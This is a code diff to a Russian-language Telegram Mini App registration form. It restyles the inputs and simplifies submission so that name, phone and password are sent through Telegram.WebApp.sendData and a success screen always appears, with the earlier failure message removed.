@@ -22,7 +22,7 @@
     .flag { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 20px; pointer-events: none; }
     .number-input { flex: 1; border: none; padding: 14px 16px; font-size: 17px; outline: none; }
     input[type="tel"]::-webkit-outer-spin-button, input[type="tel"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-    input, select { padding: 14px 16px; font-size: 17px; border: none; outline: none; }
+    input { padding: 14px 16px; font-size: 17px; border: none; outline: none; border-radius: 14px; }
     input:focus { outline: none; }
     .btn { width: 100%; max-width: 380px; padding: 16px; font-size: 18px; font-weight: 600; color: white; background: linear-gradient(145deg, #4285f4, #1967d2); border: none; border-radius: 14px; box-shadow: 0 8px 24px rgba(66,133,244,0.3); cursor: pointer; transition: all 0.24s; margin-top: 8px; }
     .btn:hover { transform: translateY(-1px); box-shadow: 0 12px 32px rgba(66,133,244,0.4); }
@@ -60,7 +60,6 @@
             <option value="+49" data-flag="🇩🇪">+49</option>
             <option value="+33" data-flag="🇫🇷">+33</option>
             <option value="+375" data-flag="🇧🇾">+375</option>
-            <!-- остальные коды -->
           </select>
           <span class="flag" id="selectedFlag">🇷🇺</span>
         </div>
@@ -146,31 +145,24 @@
 
     hideStatus();
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Создание аккаунта...';
+    submitBtn.textContent = 'Отправка...';
 
-    const payload = { action: 'register', name, phone: fullPhone, password: pass };
-
-    let sent = false;
+    const payload = {
+      action: 'register',
+      name: name,
+      phone: fullPhone,
+      password: pass
+    };
 
     if (window.Telegram?.WebApp) {
-      try {
-        window.Telegram.WebApp.sendData(JSON.stringify(payload));
-        sent = true;
-      } catch (e) {
-        console.warn('sendData failed', e);
-      }
+      window.Telegram.WebApp.sendData(JSON.stringify(payload));
+      triggerFeedback('heavy');
     }
 
     setTimeout(() => {
-      if (sent) {
-        formBlock.style.display = 'none';
-        successBlock.style.display = 'flex';
-      } else {
-        showStatus('Проблема на стороне сервера.\nОбратитесь в поддержку', true);
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Попробовать снова';
-      }
-    }, 1800);
+      formBlock.style.display = 'none';
+      successBlock.style.display = 'flex';
+    }, 900);
   }
 
   submitBtn.addEventListener('click', handleSubmit);
